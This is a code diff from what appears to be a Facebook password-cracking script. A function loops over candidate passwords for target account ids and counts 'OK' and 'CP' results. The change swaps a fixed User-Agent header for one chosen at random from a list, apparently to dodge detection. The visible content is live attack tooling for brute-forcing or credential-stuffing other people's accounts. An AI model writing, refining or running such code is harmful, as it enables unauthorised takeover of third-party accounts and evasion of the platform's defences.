@@ -1043,7 +1043,7 @@ def m1(ids,pwv):
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
     ua =usragnt
-    pro = random.choice(usrm)
+    pro = random.choice(usragent)
     warna = random.choice(my_color)
     try:
         for pas in pwv:
@@ -1072,7 +1072,7 @@ def m1(ids,pwv):
     'Content-Length': '1730',
     'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
     'Sec-CH-UA-Mobile': '?1',
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64 11;  TL-tl; SM-T531) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4445.57 Safari/537.36',
+    'User-Agent': pro,
     'X-Response-Format': 'JSONStream',
     'Content-Type': 'application/x-www-form-urlencoded',
     'X-FB-LSD': 'AVo_Z7twFKE',
